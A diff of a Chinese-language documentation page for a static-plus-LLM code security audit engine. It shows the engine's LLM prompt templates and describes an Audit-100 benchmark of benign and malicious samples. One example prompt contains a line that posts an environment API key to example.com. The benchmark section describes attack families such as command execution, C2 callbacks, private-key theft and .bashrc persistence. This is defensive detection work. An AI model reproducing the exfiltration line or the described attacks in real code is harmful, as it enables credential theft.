-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">⚡ 静态扫描引擎</text>
+              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">⚡
+                静态扫描引擎</text>
             </g>
             <g transform="translate(515, 14)">
-              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--accent) 12%, var(--panel))" stroke="color-mix(in srgb, var(--accent) 60%, var(--line))" stroke-width="1.6" />
-              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--accent)">🔄 审计引擎编排器</text>
+              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--accent) 12%, var(--panel))"
+                stroke="color-mix(in srgb, var(--accent) 60%, var(--line))" stroke-width="1.6" />
+              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--accent)">🔄
+                审计引擎编排器</text>
             </g>
             <g transform="translate(775, 14)">
-              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--warn) 12%, var(--panel))" stroke="color-mix(in srgb, var(--warn) 60%, var(--line))" stroke-width="1.6" />
-              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--warn)">🤖 本地 LLM (Ollama)</text>
+              <rect width="170" height="42" rx="8" fill="color-mix(in srgb, var(--warn) 12%, var(--panel))"
+                stroke="color-mix(in srgb, var(--warn) 60%, var(--line))" stroke-width="1.6" />
+              <text x="85" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--warn)">🤖 本地 LLM
+                (Ollama)</text>
             </g>
             <g transform="translate(975, 14)">
               <rect width="150" height="42" rx="8" fill="var(--panel)" stroke="var(--line)" stroke-width="1.5" />
-              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">🛡️ 报告与 Gate 门禁</text>
+              <text x="75" y="26" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--text)">🛡️ 报告与
+                Gate 门禁</text>
             </g>
 
             <!-- ===== 阶段 1：静态扫描时序 ===== -->
-            <line x1="600" y1="120" x2="363" y2="120" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
-            <text x="480" y="113" text-anchor="middle" font-size="11.5" fill="var(--text)">1.1 触发静态规则扫描 (scan_directory)</text>
+            <line x1="600" y1="120" x2="363" y2="120" stroke="var(--text)" stroke-width="1.8"
+              marker-end="url(#seq-arrow)" />
+            <text x="480" y="113" text-anchor="middle" font-size="11.5" fill="var(--text)">1.1 触发静态规则扫描
+              (scan_directory)</text>
 
-            <line x1="360" y1="145" x2="133" y2="145" stroke="var(--muted)" stroke-width="1.5" stroke-dasharray="3 3" marker-end="url(#seq-arrow)" />
+            <line x1="360" y1="145" x2="133" y2="145" stroke="var(--muted)" stroke-width="1.5" stroke-dasharray="3 3"
+              marker-end="url(#seq-arrow)" />
             <text x="245" y="139" text-anchor="middle" font-size="11" fill="var(--muted)">1.2 匹配源码正则与 AST 特征</text>
 
-            <line x1="360" y1="172" x2="597" y2="172" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
-            <text x="480" y="165" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">1.3 产出候选点清单 List[Finding] (含命中行号与前后各3行上下文)</text>
+            <line x1="360" y1="172" x2="597" y2="172" stroke="var(--text)" stroke-width="1.8"
+              marker-end="url(#seq-arrow)" />
+            <text x="480" y="165" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">1.3 产出候选点清单
+              List[Finding] (含命中行号与前后各3行上下文)</text>
 
             <!-- ===== 阶段 2：Finding 级单点推理 (逐条独立请求) ===== -->
-            <path d="M 600 242 L 645 242 L 645 258 L 603 258" fill="none" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#seq-arrow-accent)" />
+            <path d="M 600 242 L 645 242 L 645 258 L 603 258" fill="none" stroke="var(--accent)" stroke-width="1.5"
+              marker-end="url(#seq-arrow-accent)" />
             <text x="652" y="253" font-size="11" font-weight="600" fill="var(--accent)">循环遍历每个 Finding [1..N]</text>
 
-            <line x1="600" y1="280" x2="857" y2="280" stroke="var(--accent)" stroke-width="2" marker-end="url(#seq-arrow-accent)" />
-            <text x="730" y="273" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--accent)">2.1 POST /api/generate (Finding Prompt 独立请求)</text>
-            <text x="730" y="295" text-anchor="middle" font-size="10.5" fill="var(--muted)">[触发行 + 前后各 3 行局部代码 + 命中规则 ID / 类别说明]</text>
+            <line x1="600" y1="280" x2="857" y2="280" stroke="var(--accent)" stroke-width="2"
+              marker-end="url(#seq-arrow-accent)" />
+            <text x="730" y="273" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--accent)">2.1 POST
+              /api/generate (Finding Prompt 独立请求)</text>
+            <text x="730" y="295" text-anchor="middle" font-size="10.5" fill="var(--muted)">[触发行 + 前后各 3 行局部代码 + 命中规则 ID
+              / 类别说明]</text>
 
-            <line x1="860" y1="326" x2="603" y2="326" stroke="var(--accent)" stroke-width="1.8" stroke-dasharray="4 4" marker-end="url(#seq-arrow-accent)" />
-            <text x="730" y="318" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--accent)">2.2 返回单点判定 JSON: {"verdict": "BENIGN/MALICIOUS", "reason": "..."}</text>
-            <text x="730" y="340" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入 finding.llm_verdict，排除局部误报点</text>
+            <line x1="860" y1="326" x2="603" y2="326" stroke="var(--accent)" stroke-width="1.8" stroke-dasharray="4 4"
+              marker-end="url(#seq-arrow-accent)" />
+            <text x="730" y="318" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--accent)">2.2
+              返回单点判定 JSON: {"verdict": "BENIGN/MALICIOUS", "reason": "..."}</text>
+            <text x="730" y="340" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入
+              finding.llm_verdict，排除局部误报点</text>
 
             <!-- ===== 阶段 3：File 级攻击链研判 (按文件独立请求) ===== -->
-            <path d="M 600 400 L 645 400 L 645 416 L 603 416" fill="none" stroke="var(--warn)" stroke-width="1.5" marker-end="url(#seq-arrow-warn)" />
+            <path d="M 600 400 L 645 400 L 645 416 L 603 416" fill="none" stroke="var(--warn)" stroke-width="1.5"
+              marker-end="url(#seq-arrow-warn)" />
             <text x="652" y="411" font-size="11" font-weight="600" fill="var(--warn)">按文件分组汇总 group_by_file</text>
 
-            <line x1="600" y1="438" x2="857" y2="438" stroke="var(--warn)" stroke-width="2" marker-end="url(#seq-arrow-warn)" />
-            <text x="730" y="431" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--warn)">3.1 POST /api/generate (File Prompt 独立请求)</text>
-            <text x="730" y="453" text-anchor="middle" font-size="10.5" fill="var(--muted)">[文件前 80 行代码 + 命中的规则摘要 CMD_001, EXF_001...]</text>
+            <line x1="600" y1="438" x2="857" y2="438" stroke="var(--warn)" stroke-width="2"
+              marker-end="url(#seq-arrow-warn)" />
+            <text x="730" y="431" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--warn)">3.1 POST
+              /api/generate (File Prompt 独立请求)</text>
+            <text x="730" y="453" text-anchor="middle" font-size="10.5" fill="var(--muted)">[文件前 80 行代码 + 命中的规则摘要
+              CMD_001, EXF_001...]</text>
 
-            <line x1="860" y1="484" x2="603" y2="484" stroke="var(--warn)" stroke-width="1.8" stroke-dasharray="4 4" marker-end="url(#seq-arrow-warn)" />
-            <text x="730" y="476" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--warn)">3.2 返回文件级攻击链 JSON: {"risk_level": "HIGH", "chained": true, "exfiltration": true}</text>
-            <text x="730" y="498" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入 file_summaries[file]，记录跨行协同攻击特征</text>
+            <line x1="860" y1="484" x2="603" y2="484" stroke="var(--warn)" stroke-width="1.8" stroke-dasharray="4 4"
+              marker-end="url(#seq-arrow-warn)" />
+            <text x="730" y="476" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--warn)">3.2
+              返回文件级攻击链 JSON: {"risk_level": "HIGH", "chained": true, "exfiltration": true}</text>
+            <text x="730" y="498" text-anchor="middle" font-size="10.5" fill="var(--muted)">编排器写入
+              file_summaries[file]，记录跨行协同攻击特征</text>
 
             <!-- ===== 阶段 4：综合决策与 Gate 门禁 ===== -->
-            <line x1="600" y1="565" x2="1047" y2="565" stroke="var(--text)" stroke-width="1.8" marker-end="url(#seq-arrow)" />
-            <text x="825" y="557" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">4.1 汇聚双级结论 generate_audit_report(findings, file_summaries)</text>
+            <line x1="600" y1="565" x2="1047" y2="565" stroke="var(--text)" stroke-width="1.8"
+              marker-end="url(#seq-arrow)" />
+            <text x="825" y="557" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--text)">4.1 汇聚双级结论
+              generate_audit_report(findings, file_summaries)</text>
 
-            <path d="M 1050 585 L 1095 585 L 1095 601 L 1053 601" fill="none" stroke="currentColor" stroke-width="1.5" marker-end="url(#seq-arrow)" />
+            <path d="M 1050 585 L 1095 585 L 1095 601 L 1053 601" fill="none" stroke="currentColor" stroke-width="1.5"
+              marker-end="url(#seq-arrow)" />
             <text x="1102" y="596" font-size="10.5" font-weight="600" fill="var(--text)">计算 Gate 门禁策略</text>
 
-            <line x1="1050" y1="620" x2="603" y2="620" stroke="var(--success)" stroke-width="2" stroke-dasharray="5 4" marker-end="url(#seq-arrow-success)" />
-            <text x="825" y="613" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--success)">4.2 输出 audit_report.json 最终审计报告 (passed: true/false 阻断决策)</text>
+            <line x1="1050" y1="620" x2="603" y2="620" stroke="var(--success)" stroke-width="2" stroke-dasharray="5 4"
+              marker-end="url(#seq-arrow-success)" />
+            <text x="825" y="613" text-anchor="middle" font-size="11.5" font-weight="700" fill="var(--success)">4.2 输出
+              audit_report.json 最终审计报告 (passed: true/false 阻断决策)</text>
           </svg>
 
           <!-- 核心时序机制解构说明卡片 -->
@@ -3076,7 +3578,8 @@
             </div>
             <div class="seq-summary-card">
               <span class="seq-summary-title warn">🌐 宏观拓扑研判（文件级）</span>
-              <p class="seq-summary-desc">在文件内命中的所有规则被去重汇总后，单独调用 File Prompt，结合前 80 行代码判定是否存在分段窃取、编码后外传的 chained 攻击链。</p>
+              <p class="seq-summary-desc">在文件内命中的所有规则被去重汇总后，单独调用 File Prompt，结合前 80 行代码判定是否存在分段窃取、编码后外传的 chained 攻击链。
+              </p>
             </div>
             <div class="seq-summary-card">
               <span class="seq-summary-title">🛡️ Fail-Closed 故障隔离</span>
@@ -3092,36 +3595,37 @@
             <ul>
               <li><span class="mono">file</span>：完整路径。</li>
               <li><span class="mono">line</span>：触发规则的行号。</li>
-              <li><span class="mono">rule_id</span>、<span class="mono">category</span>、<span class="mono">description</span>：规则语义。</li>
+              <li><span class="mono">rule_id</span>、<span class="mono">category</span>、<span
+                  class="mono">description</span>：规则语义。</li>
               <li><span class="mono">context_before</span>：触发行前 3 行。</li>
               <li><span class="mono">code_snippet</span>：触发行本身。</li>
               <li><span class="mono">context_after</span>：触发行后 3 行。</li>
             </ul>
             <div class="codebox">你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。
 
-## 代码片段
-文件: /path/to/sample.py (第 42 行)
-```python
-import os
-import requests
-api_key = os.getenv("API_KEY")
-&gt;&gt;&gt; requests.post("https://example.com/upload", json={"key": api_key})
-print("done")
-```
+              ## 代码片段
+              文件: /path/to/sample.py (第 42 行)
+              ```python
+              import os
+              import requests
+              api_key = os.getenv("API_KEY")
+              &gt;&gt;&gt; requests.post("https://example.com/upload", json={"key": api_key})
+              print("done")
+              ```
 
-## 触发的规则
-规则ID: NET_001
-类别: 网络请求
-严重度: HIGH
-规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。
+              ## 触发的规则
+              规则ID: NET_001
+              类别: 网络请求
+              严重度: HIGH
+              规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。
 
-## 请回答
-1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定)
-2. reason: 一句话说明理由（中文）
-3. risk: 如果恶意，数据会怎样被利用
+              ## 请回答
+              1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定)
+              2. reason: 一句话说明理由（中文）
+              3. risk: 如果恶意，数据会怎样被利用
 
-请严格按以下 JSON 格式回答，不要包含其他内容:
-{"verdict":"...","reason":"...","risk":"..."}</div>
+              请严格按以下 JSON 格式回答，不要包含其他内容:
+              {"verdict":"...","reason":"...","risk":"..."}</div>
           </div>
           <div class="spec">
             <div class="tag">File 级</div>
@@ -3130,19 +3634,20 @@ print("done")
               <li><span class="mono">file</span>：文件 basename，不再需要完整路径。</li>
               <li><span class="mono">line_count</span>：文件总行数。</li>
               <li><span class="mono">findings_count</span>：静态命中数。</li>
-              <li><span class="mono">findings_summary</span>：去重后的规则摘要，格式如 <span class="mono">CMD_001(命令执行,HIGH)</span>。</li>
+              <li><span class="mono">findings_summary</span>：去重后的规则摘要，格式如 <span class="mono">CMD_001(命令执行,HIGH)</span>。
+              </li>
               <li><span class="mono">full_code</span>：最多前 80 行源码；超过后追加截断说明。</li>
             </ul>
             <div class="codebox">文件: sample.py (123 行)
-发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH)
+              发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH)
 
-```python
-前 80 行代码
-# ... (截断，文件超过 80 行)
-```
+              ```python
+              前 80 行代码
+              # ... (截断，文件超过 80 行)
+              ```
 
-严格按 JSON 回答:
-{"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}</div>
+              严格按 JSON 回答:
+              {"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}</div>
           </div>
         </div>
 
@@ -3170,25 +3675,30 @@ print("done")
         </div>
       </section>
 
-                  <section class="section" id="benchmark-design">
+      <section class="section" id="benchmark-design">
         <h2>4. Benchmark 评测基准设计 (Audit-100)</h2>
-        <p class="lead">评估代码安全审计引擎的核心挑战在于平衡<strong>误报率（False Positive Rate, FPR）</strong>与<strong>漏报率（False Negative Rate, FNR）</strong>，并在有限计算资源下追求最高性价比。当前行业内存在两大技术流派：一是激进的<strong>【纯端到端 LLM 审计（Pure-LLM）】</strong>，即直接将全量源代码塞入大模型，不做任何先验规则过滤；二是工程化的<strong>【动静两阶段协同审计（Static-LLM）】</strong>，通过静态规则完成毫秒级初筛与零命中算力旁路，并仅将疑点及行级规则上下文锚定交付大模型定点仲裁。为此，我们设计并构建了标准化的 <strong>Audit-100 Benchmark</strong>，作为评估两套范式在准确率、算力开销与攻防鲁棒性上的可度量标尺。</p>
+        <p class="lead">评估代码安全审计引擎的核心挑战在于平衡<strong>误报率（False Positive Rate, FPR）</strong>与<strong>漏报率（False Negative
+            Rate, FNR）</strong>，并在有限计算资源下追求最高性价比。当前行业内存在两大技术流派：一是激进的<strong>【纯端到端 LLM
+            审计（Pure-LLM）】</strong>，即直接将全量源代码塞入大模型，不做任何先验规则过滤；二是工程化的<strong>【动静两阶段协同审计（Static-LLM）】</strong>，通过静态规则完成毫秒级初筛与零命中算力旁路，并仅将疑点及行级规则上下文锚定交付大模型定点仲裁。为此，我们设计并构建了标准化的
+          <strong>Audit-100 Benchmark</strong>，作为评估两套范式在准确率、算力开销与攻防鲁棒性上的可度量标尺。
+        </p>
 
         <!-- 架构概述卡片 -->
         <div class="bm-concept-banner">
           <div class="bm-banner-top">
             <span class="bm-banner-icon">🎯</span>
-            <h3 class="bm-banner-title">基准全景：100 样本 / 10 细分对抗家族 / 50:50 对称样本集</h3>
+            <h3 class="bm-banner-title">基准全景：4 大真实工业基座 / 10 细分对抗家族 / 100 样本完全正交平衡矩阵</h3>
           </div>
           <p class="bm-banner-text">
-            评测集基于 3 个真实开源 AI 项目（<code>LogisticRegression</code>、<code>TEE-test</code>、<code>Retina-DKD</code>）作为源码基座，严格派生出 100 个具备独立沙箱沙盒的代码样本。
-            样本集按 <strong>50 个良性误报探针（Benign FP Probes）</strong> 与 <strong>50 个恶意攻击载荷（Malicious Attack Samples）</strong> 对称分布，
-            用于精准对比<strong>“纯端到端 LLM 盲审”</strong>与<strong>“静态快速初筛 + LLM 定向语义仲裁”</strong>在实际算法工程代码中的综合对抗能力与工程 ROI。
+            评测基准彻底淘汰伪数据模拟玩具脚本，选取开源社区 4 大工业级经典算法训练工程（<code>XGBoost-Finance</code> 真实表格金融风控、<code>Retina-ResNet</code> 真实医学影像视觉分类、<code>YOLOv8-Detection</code> 真实工业目标检测、<code>BERT-Sentiment</code> 真实 HuggingFace 文本情感微调）作为源码基座，严格派生出 100 个具备独立沙箱的代码样本。
+            样本集按 <strong>50 个良性误报探针（Benign FP Probes）</strong> 与 <strong>50 个恶意攻击载荷（Malicious Attack Samples）</strong> 在 4 大基座中呈 <strong>1:1 严格正交对称分布（每个基座各含 12~13 个良性与 13~12 个恶意样本）</strong>，
+            彻底切断大模型利用“识别项目类型”盲猜标签的先验投机途径，用于精准对比<strong>“纯端到端 LLM 盲审”</strong>与<strong>“静态快速初筛 + LLM 定向语义仲裁”</strong>在实际算法工程代码中的综合对抗能力与工程 ROI。
           </p>
         </div>
 
         <!-- 理论基础与假设：纯 LLM vs 动静协同 -->
-        <h3 style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>⚖️</span> 双轨范式的理论基础与工程假设对比
         </h3>
         <p style="font-size: 13px; color: var(--muted); margin: 0 0 14px;">
@@ -3196,7 +3706,8 @@ print("done")
         </p>
 
         <div class="bm-goal-matrix">
-          <div class="bm-goal-card" style="border-top: 4px solid var(--muted); box-shadow: 0 4px 16px rgba(140, 149, 159, 0.05);">
+          <div class="bm-goal-card"
+            style="border-top: 4px solid var(--muted); box-shadow: 0 4px 16px rgba(140, 149, 159, 0.05);">
             <div class="bm-goal-head">
               <span class="bm-goal-title" style="color: var(--text);">🤖 方案 A：纯端到端 LLM 盲审 (Pure-LLM Baseline)</span>
               <span class="bm-goal-badge" style="color: var(--muted);">算力旁路率: 0%</span>
@@ -3207,23 +3718,29 @@ print("done")
             <p class="bm-goal-desc" style="color: var(--muted); font-size: 12px; line-height: 1.55;">
               <strong>理论假设与工程缺陷：</strong><br>
               1. <strong>无法进行快速旁路（Bypass Rate 0%）：</strong>必须对 100% 的代码样本进行高功耗大模型推理，GPU/CPU 算力消耗高企，批量扫描延迟达数秒乃至十几秒。<br>
-              2. <strong>长上下文注意力涣散 (Lost in the Middle)：</strong>端到端大模型缺少精准的代码违规行号与模式引导，在长源码中难以准确定位隐蔽的反弹 Shell 或多层混淆代码，导致<strong>漏报率（FNR）上升</strong>。<br>
-              3. <strong>常规业务高度过敏 (High FPR)：</strong>小参数模型面对复杂的类封装、环境目录探测（<code>os.environ.get</code>）或正常日志打印时缺乏边界约束，极易产生“安全幻觉”，草率定性为恶意外传。
+              2. <strong>长上下文注意力涣散 (Lost in the Middle)：</strong>端到端大模型缺少精准的代码违规行号与模式引导，在长源码中难以准确定位隐蔽的反弹 Shell
+              或多层混淆代码，导致<strong>漏报率（FNR）上升</strong>。<br>
+              3. <strong>常规业务高度过敏 (High
+                FPR)：</strong>小参数模型面对复杂的类封装、环境目录探测（<code>os.environ.get</code>）或正常日志打印时缺乏边界约束，极易产生“安全幻觉”，草率定性为恶意外传。
             </p>
           </div>
 
-          <div class="bm-goal-card" style="border-top: 4px solid var(--accent); box-shadow: 0 4px 16px rgba(88, 166, 255, 0.05);">
+          <div class="bm-goal-card"
+            style="border-top: 4px solid var(--accent); box-shadow: 0 4px 16px rgba(88, 166, 255, 0.05);">
             <div class="bm-goal-head">
-              <span class="bm-goal-title" style="color: var(--accent);">⚡ 方案 B：动静两阶段协同体系 (Static + LLM Synergistic)</span>
+              <span class="bm-goal-title" style="color: var(--accent);">⚡ 方案 B：动静两阶段协同体系 (Static + LLM
+                Synergistic)</span>
               <span class="bm-goal-badge" style="color: var(--accent);">算力旁路率: 50%</span>
             </div>
             <p class="bm-goal-desc">
-              <strong>审计逻辑：</strong>Stage 1 采用高吞吐静态正则进行毫秒级宽召回初筛；对零命中代码直接快速放行；仅对命中疑点的样本，将<strong>行级锚点（上下文 7 行）</strong>与<strong>规则特征元数据</strong>注入 LLM 做定向语义仲裁。
+              <strong>审计逻辑：</strong>Stage 1 采用高吞吐静态正则进行毫秒级宽召回初筛；对零命中代码直接快速放行；仅对命中疑点的样本，将<strong>行级锚点（上下文 7
+                行）</strong>与<strong>规则特征元数据</strong>注入 LLM 做定向语义仲裁。
             </p>
             <p class="bm-goal-desc" style="color: var(--muted); font-size: 12px; line-height: 1.55;">
               <strong>理论假设与工程优势：</strong><br>
               1. <strong>精准 50% 快速旁路：</strong>50 个纯净良性样本被静态规则以 &lt;50ms 极速确认并放行，免唤醒大模型，推理能耗与推断总延迟直接减半。<br>
-              2. <strong>定点聚焦与先验约束：</strong>静态初筛为 LLM 提供了精准的行号、触发规则与局部上下文，让小模型从“全篇盲搜”转化为“靶向释疑”，有效压制语法假阳性，<strong>良性误报率（FPR）大幅压降</strong>。<br>
+              2. <strong>定点聚焦与先验约束：</strong>静态初筛为 LLM
+              提供了精准的行号、触发规则与局部上下文，让小模型从“全篇盲搜”转化为“靶向释疑”，有效压制语法假阳性，<strong>良性误报率（FPR）大幅压降</strong>。<br>
               3. <strong>Fail-Closed 保底防穿透：</strong>针对深度混淆导致小模型输出 UNCERTAIN 时，安全门禁强行维持拦截策略，彻底杜绝恶意代码因模型能力局限而逃逸放行。
             </p>
           </div>
@@ -3237,7 +3754,8 @@ print("done")
               <span class="bm-goal-badge" style="color: var(--success, #10b981);">预期决策：放行 (PASS)</span>
             </div>
             <p class="bm-goal-desc">
-              <strong>构造原理：</strong>覆盖算法工程中的合法操作（文件 I/O 读参、环境目录获取、指标标准输出、模型结构序列化落盘等）。用于检验纯 LLM 是否产生过度敏感，以及协同体系中 LLM 能否结合上下文精准豁免合规代码。
+              <strong>构造原理：</strong>覆盖算法工程中的合法操作（文件 I/O 读参、环境目录获取、指标标准输出、模型结构序列化落盘等）。用于检验纯 LLM 是否产生过度敏感，以及协同体系中 LLM
+              能否结合上下文精准豁免合规代码。
             </p>
           </div>
 
@@ -3247,13 +3765,15 @@ print("done")
               <span class="bm-goal-badge" style="color: var(--danger, #ef4444);">预期决策：阻断 (BLOCK)</span>
             </div>
             <p class="bm-goal-desc">
-              <strong>构造原理：</strong>覆盖子进程命令派生、敏感凭据窥探、反弹 Socket/HTTP 外联通信、Base64/Pickle 混淆载荷以及系统级持久化后门。用于检验纯 LLM 盲审与协同双阶段模式下的攻防对抗鲁棒性。
+              <strong>构造原理：</strong>覆盖子进程命令派生、敏感凭据窥探、反弹 Socket/HTTP 外联通信、Base64/Pickle 混淆载荷以及系统级持久化后门。用于检验纯 LLM
+              盲审与协同双阶段模式下的攻防对抗鲁棒性。
             </p>
           </div>
         </div>
 
         <!-- 10 个家族分类标准体系 -->
-        <h3 style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>🧩</span> 10 维代码变体家族矩阵（5 良性 B1~B5 + 5 恶意 M1~M5）
         </h3>
         <p style="font-size: 13px; color: var(--muted); margin: 0 0 12px;">
@@ -3350,7 +3870,8 @@ print("done")
               </div>
               <span class="rule-cat-badge" style="color: var(--danger, #ef4444);">高危攻击 (10样本)</span>
             </div>
-            <p class="bm-family-desc">调用 <code>subprocess.Popen</code>、<code>os.system</code> 等派生 OS 底层 Shell，执行任意系统命令，测试容器沙箱逃逸防御与进程派生检测能力。</p>
+            <p class="bm-family-desc">调用 <code>subprocess.Popen</code>、<code>os.system</code> 等派生 OS 底层
+              Shell，执行任意系统命令，测试容器沙箱逃逸防御与进程派生检测能力。</p>
             <div class="bm-family-foot">
               <span>基线拦截规则：CMD_001</span>
               <span style="color: var(--danger, #ef4444); font-weight: 700;">预期裁决：MALICIOUS (阻断)</span>
@@ -3366,7 +3887,8 @@ print("done")
               </div>
               <span class="rule-cat-badge" style="color: var(--danger, #ef4444);">高危攻击 (10样本)</span>
             </div>
-            <p class="bm-family-desc">使用 <code>requests.post</code>、<code>urllib</code> 或原生 <code>socket</code> 建立外联通信，向远端 C2 服务器回传内网环境或模型资产数据。</p>
+            <p class="bm-family-desc">使用 <code>requests.post</code>、<code>urllib</code> 或原生 <code>socket</code>
+              建立外联通信，向远端 C2 服务器回传内网环境或模型资产数据。</p>
             <div class="bm-family-foot">
               <span>基线拦截规则：NET_001, NET_002</span>
               <span style="color: var(--danger, #ef4444); font-weight: 700;">预期裁决：MALICIOUS (阻断)</span>
@@ -3382,7 +3904,8 @@ print("done")
               </div>
               <span class="rule-cat-badge" style="color: var(--warn);">中危攻击 (10样本)</span>
             </div>
-            <p class="bm-family-desc">针对性窥探容器内 <code>.env</code> 文件、宿主 <code>id_rsa</code> 私钥，或遍历环境变量窃取云厂商 API Token、数据库连接串。</p>
+            <p class="bm-family-desc">针对性窥探容器内 <code>.env</code> 文件、宿主 <code>id_rsa</code> 私钥，或遍历环境变量窃取云厂商 API
+              Token、数据库连接串。</p>
             <div class="bm-family-foot">
               <span>基线拦截规则：FIL_001, ENV_001</span>
               <span style="color: var(--danger, #ef4444); font-weight: 700;">预期裁决：MALICIOUS (阻断)</span>
@@ -3414,7 +3937,8 @@ print("done")
               </div>
               <span class="rule-cat-badge" style="color: var(--danger, #ef4444);">高危攻击 (10样本)</span>
             </div>
-            <p class="bm-family-desc">跨文件编排攻击向量：提取敏感变量 → 序列化打包 → 网络隐蔽外发 → 向 <code>.bashrc</code> 写入定时任务常驻，测试跨文件全局攻击链判定。</p>
+            <p class="bm-family-desc">跨文件编排攻击向量：提取敏感变量 → 序列化打包 → 网络隐蔽外发 → 向 <code>.bashrc</code> 写入定时任务常驻，测试跨文件全局攻击链判定。
+            </p>
             <div class="bm-family-foot">
               <span>基线拦截规则：PER_001, EXF_001</span>
               <span style="color: var(--danger, #ef4444); font-weight: 700;">预期裁决：MALICIOUS (阻断)</span>
@@ -3423,32 +3947,116 @@ print("done")
         </div>
 
         <!-- 源项目隔离机制架构 -->
+        <!-- 4大真实工业基座与全正交架构 -->
         <div class="card" style="margin-top: 24px; padding: 20px;">
           <h3 style="margin-top:0; font-size: 15px; display: flex; align-items: center; gap: 8px;">
-            <span>🔬</span> 源项目隔离架构：消除数据集先验偏置 (Source Isolation)
+            <span>🔬</span> 4 大真实工业基座与全正交架构：彻底消除领域混淆偏置 (Orthogonal Design)
           </h3>
           <p style="font-size: 13px; line-height: 1.6; color: var(--text); margin: 0 0 12px;">
-            在纯 LLM 与协同审计评测中，若良性与恶意样本源自同一工程，模型极易由于<strong>上下文先验偏置（Contextual Bias）</strong>产生虚假泛化：例如仅凭该项目的特定模块名、作者注释或编码风格即可推断标签，而无需真正理解代码执行语义。为此我们严格实施<strong>源项目隔离（Source Isolation）</strong>：
+            在早期基准设计中，良性样本全部取自简单脚本，恶意样本全部取自深度学习工程，造成了严重的<strong>领域混淆偏置（Domain Confounding）</strong>与标签泄漏（模型仅凭识别代码属于哪种项目即可盲猜结论）。为此，Audit-100 全面淘汰伪数据模拟玩具，正式确立<strong>4 大开源经典生产工程基座</strong>，并构建 <strong>4 基座 × 25 样本 = 100 样本完全正交平衡矩阵</strong>：
           </p>
           <div class="spec-grid" style="margin-top: 8px;">
             <div class="spec" style="background: var(--panel-2);">
-              <div class="tag">良性样本基座 (50 样本)</div>
-              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">LogisticRegression (25) + TEE-test (25)</h4>
-              <p style="font-size: 12.5px; color: var(--muted); margin:0;">涵盖经典线性分类模型与底层 TEE 测试桩。代码符合业界标准算法实践，包含规范的类封装与评估流水线，作为<strong>合法业务基准</strong>。</p>
+              <div class="tag" style="color: var(--accent);">P1 · 真实表格机器学习 (25 样本: 13良/12恶)</div>
+              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">XGBoost-Finance 信用卡风控流水线</h4>
+              <p style="font-size: 12.5px; color: var(--muted); margin:0;">基于 Kaggle 真实脱敏信用卡交易数据，涵盖特征分箱、数据标准化清洗、5折交叉验证与 <code>joblib</code> 序列化，取代原无真实参考性的模拟脚本。</p>
             </div>
             <div class="spec" style="background: var(--panel-2);">
-              <div class="tag" style="color: var(--danger, #ef4444);">恶意样本基座 (50 样本)</div>
-              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">Retina-DKD 深度学习医学影像项目 (50)</h4>
-              <p style="font-size: 12.5px; color: var(--muted); margin:0;">基于复杂的 ResNet 图像处理模型，在真实深度学习训练流程中植入隐蔽的攻击载荷，作为<strong>高危对抗基准</strong>。</p>
+              <div class="tag" style="color: var(--accent);">P2 · 真实计算机视觉 CNN (25 样本: 12良/13恶)</div>
+              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">Retina-ResNet 医疗医学影像分类</h4>
+              <p style="font-size: 12.5px; color: var(--muted); margin:0;">基于真实 ResNet-50 眼底血管影像诊断流水线，经<strong>白盒底噪清洗</strong>（移除原生 <code>os.system</code> 与 <code>eval</code>），提供纯净的真实深度学习分类基座。</p>
+            </div>
